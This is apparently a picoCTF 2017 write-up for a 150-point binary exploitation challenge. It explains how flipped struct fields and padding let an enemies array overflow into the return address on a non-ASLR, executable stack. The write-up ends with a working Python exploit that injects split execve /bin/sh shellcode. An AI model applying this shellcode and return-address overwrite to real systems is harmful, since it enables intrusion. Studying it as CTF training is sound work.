# Final Challenge - 150 Points

Unhappy that you can't choose which enemies to fight? [Choose](https://webshell2017.picoctf.com/static/6af7ca160d078a41f5ee39299fa4cb71/choose) your own adventure. [Source](https://webshell2017.picoctf.com/static/6af7ca160d078a41f5ee39299fa4cb71/choose.c). Connect on shell2017.picoctf.com:4463. ASLR is not enabled.

## Write-up
This problem is basically some sort of attack simulation game, where you and an opponent each take one turn to fight to the death. You get to choose 11 enemies and then you have to fight the dragon, which is unbeatable. There were several small bugs, but one was able to let you run arbitrary code. The `struct` definitions represented each type of opponent you would fight. 

However, there were two of them where the `health` and `damange` fields are flipped (for `centaur` and `unicorn`). By itself, it doesn't cause any other issues, but because of [padding](http://stackoverflow.com/q/4306186/7344257) what we end up is 4 extra bytes for `centaur` and `unicorn` structs. This allows us to overflow the `enemies` array just enough to overwrite the return address. Since ASLR was not enabled, and also the stack is set as executable, we could write shellcode on the stack, and then change the return address to point to this stack. We write to stack via the enemies' names, and we get shell! We can also use the 'wizard sight' to easily get address of the stack. Here's the python code we used:

```python
#[Segment I]
#mov eax, -11
#neg eax
#xor edx, edx
#jmp 0x0D ; use byte form of assembly

#[Segment II]
#mov ebx, 0xFFFFD5DA
#push edx
#push ebx
#mov ecx, esp
#int 0x80

monsters = "c" + "\nc" * 9 + "\no" # create monsters to fight
seg1 = "\n\xB8\xF5\xFF\xFF\xFF\xF7\xD8\x31\xD2\xEB\x0D" # first segment of shellcode, jmp to next segment.
seg2 = "\n\xBB\xDA\xD5\xFF\xFF\x52\x53\x89\xE1\xCD\x80" # second segment of shellcode
bin = "\n/bin/sh" # shell
blanks = "\nh" * 7 # blank names
bof = "\naaaa\xaa\xd5\xff\xffxxxx" # bof exploit to overwrite return address
print(monsters + seg1 + seg2 + bin + blanks + bof + "\na"*38) # print and exploit!
```

## Helpful Resources
[http://stackoverflow.com/q/4306186/7344257](http://stackoverflow.com/q/4306186/7344257)